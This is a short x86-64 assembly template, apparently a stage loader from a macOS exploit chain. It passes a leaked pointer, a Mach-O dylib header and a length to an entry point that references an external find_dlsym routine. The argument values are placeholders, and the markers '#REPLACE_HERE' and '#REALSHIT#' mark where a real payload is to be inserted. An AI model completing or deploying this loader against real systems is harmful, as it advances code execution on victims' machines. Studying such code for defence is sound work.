.text

.extern find_dlsym

_start:

  mov rdi, [_leak + rip]  # leaked ptr
  mov rsi, [_dylib + rip] # MachO header
  mov rdx, [_len + rip]   # length
  jmp _entry

# args
_leak:
  .quad 0xccccddddeeeeffff
_dylib:
  .quad 0xdeadbeefdeadbeef
_len:
  .quad 0xaaaabbbbccccdddd


_padding:
.zero 1#REPLACE_HERE


_entry:
  .string "#REALSHIT#"